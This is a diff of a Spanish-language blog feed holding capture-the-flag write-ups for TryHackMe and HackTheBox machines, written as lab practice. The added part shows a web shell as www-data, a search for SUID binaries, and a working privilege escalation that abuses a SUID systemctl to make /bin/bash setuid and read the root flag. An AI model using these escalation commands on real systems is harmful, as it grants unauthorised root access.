+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Estamos dentro de la maquina, ahora a buscar la flag 1&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;What is the name of the user who manages the webserver?
+bill&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
+8xx7x92xbexax6xa22x63x6x00xcfxexb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;What is the user flag?
+8xdx99xxxfexaxadxxa6x36x1x0xcxcxxb&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h3&gt;
+
+&lt;p&gt;la maquina nos da una ayuda, utilidar el comando &lt;em&gt;find / -user root -perm -4000 -exec ls -ldb {} \;&lt;/em&gt;, sin embargo,
+tambien es valido utilizar &lt;em&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null               
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/squid/pinger
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/systemctl
+/bin/ping
+/bin/fusermount
+/sbin/mount.cifs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;On the system, search for all SUID files. What file stands out?
+/bin/systemctl&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Podemos observar que entre los binarios se encuentra systemctl, por lo cual vamos a utilizarlo para obtener privilegios root, con 
+los siguientes comandos.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Primero, creamos el archivo para la conexion de shell inversa&lt;/li&gt;
+  &lt;li&gt;mediante el servicio creado le damos permisos &lt;em&gt;SUID&lt;/em&gt; a &lt;em&gt;/bin/bash&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;confirmamos que somos usuarios &lt;em&gt;root&lt;/em&gt; y leemos la flag
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ TF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;.service
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[Service]
+Type=oneshot
+ExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot;
+[Install]
+WantedBy=multi-user.target'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
+/bin/systemctl &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
+/bin/systemctl &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--now&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;Created symlink from /etc/systemd/system/tmp.0KBttF7QOg.service to /tmp/tmp.0KBttF7QOg.service.
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.0KBttF7QOg.service to /tmp/tmp.0KBttF7QOg.service.
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /bin/bash
+&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root root 1037528 May 16  2017 /bin/bash
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;egid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
+x5xfxxxx9fxax27x36xd3xax9x6c7xd5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;blockquote&gt;
+      &lt;p&gt;Become root and get the last flag (/root/root.txt)
+x5xfx85x9x0x9x7x6xd33ax9x6cxfx5&lt;/p&gt;
+    &lt;/blockquote&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="Nmap" /><category term="Gobuster" /><category term="Burp suite" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">Hackthebox: Secret</title><link href="http://localhost:4000/Secret/" rel="alternate" type="text/html" title="Hackthebox: Secret" /><published>2021-11-09T00:00:00-05:00</published><updated>2021-11-09T00:00:00-05:00</updated><id>http://localhost:4000/Secret</id><content type="html" xml:base="http://localhost:4000/Secret/">&lt;h2 id=&quot;iniciamos-comprobando-que-la-maquina-este-activa-antes-que-nada&quot;&gt;Iniciamos comprobando que la maquina este activa antes que nada&lt;/h2&gt;
 
 &lt;p&gt;hacemos el envio de un paquete mediante ping para confirmar que la maquina esta activa, al mismo tiempo comprovamos que estamos
 frente a una maquina linux mediante el &lt;em&gt;ttl&lt;/em&gt;&lt;/p&gt;
@@ -94,24 +428,7 @@ by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span 
 &lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
 2021/11/09 08:35:09 Finished
 &lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="hackthebox" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">Mrrobot</title><link href="http://localhost:4000/MrRobot/" rel="alternate" type="text/html" title="Mrrobot" /><published>2021-11-01T00:00:00-05:00</published><updated>2021-11-01T00:00:00-05:00</updated><id>http://localhost:4000/MrRobot</id><content type="html" xml:base="http://localhost:4000/MrRobot/">&lt;p&gt;title: “tryhackme: Mr Robot”
-share: false
-excerpt: “El mejor metodo de aprendizaje es practicando”
-share: false
-header:
-  teaser:  /assets/images/MrRobot/logo.jpg
-  teaser_home_page: true
-categories:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;tryhackme
-tags:&lt;/li&gt;
-  &lt;li&gt;web&lt;/li&gt;
-  &lt;li&gt;
-    &lt;h2 id=&quot;wordpress&quot;&gt;wordpress&lt;/h2&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;comprobaremos-que-la-maquina-se-encuentre-activa&quot;&gt;Comprobaremos que la maquina se encuentre activa&lt;/h1&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="hackthebox" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">tryhackme: Mr Robot</title><link href="http://localhost:4000/MrRobot/" rel="alternate" type="text/html" title="tryhackme: Mr Robot" /><published>2021-11-01T00:00:00-05:00</published><updated>2021-11-01T00:00:00-05:00</updated><id>http://localhost:4000/MrRobot</id><content type="html" xml:base="http://localhost:4000/MrRobot/">&lt;h1 id=&quot;comprobaremos-que-la-maquina-se-encuentre-activa&quot;&gt;Comprobaremos que la maquina se encuentre activa&lt;/h1&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.115.49
 PING 10.10.115.49 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.115.49&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
@@ -358,7 +675,7 @@ Welcome to Interactive Mode &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; pre
 &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;key-3-of-3.txt
 x4x8xxxef27x3dee1ex161bx1x7xbxe4
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h2 id=&quot;maquina-terminada&quot;&gt;Maquina terminada&lt;/h2&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><summary type="html">title: “tryhackme: Mr Robot” share: false excerpt: “El mejor metodo de aprendizaje es practicando” share: false header: teaser: /assets/images/MrRobot/logo.jpg teaser_home_page: true categories: tryhackme tags: web wordpress</summary></entry><entry><title type="html">tryhackme: Kenobi</title><link href="http://localhost:4000/kenobi/" rel="alternate" type="text/html" title="tryhackme: Kenobi" /><published>2021-10-25T00:00:00-05:00</published><updated>2021-10-25T00:00:00-05:00</updated><id>http://localhost:4000/kenobi</id><content type="html" xml:base="http://localhost:4000/kenobi/">&lt;h2 id=&quot;comprovamos-que-la-maquina-este-iniciada-correctamente-enviandole-un-ping&quot;&gt;Comprovamos que la maquina este iniciada correctamente enviandole un &lt;em&gt;ping&lt;/em&gt;&lt;/h2&gt;
+&lt;h2 id=&quot;maquina-terminada&quot;&gt;Maquina terminada&lt;/h2&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="web" /><category term="wordpress" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">tryhackme: Kenobi</title><link href="http://localhost:4000/kenobi/" rel="alternate" type="text/html" title="tryhackme: Kenobi" /><published>2021-10-25T00:00:00-05:00</published><updated>2021-10-25T00:00:00-05:00</updated><id>http://localhost:4000/kenobi</id><content type="html" xml:base="http://localhost:4000/kenobi/">&lt;h2 id=&quot;comprovamos-que-la-maquina-este-iniciada-correctamente-enviandole-un-ping&quot;&gt;Comprovamos que la maquina este iniciada correctamente enviandole un &lt;em&gt;ping&lt;/em&gt;&lt;/h2&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.37.122
 PING 10.10.37.122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.37.122&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
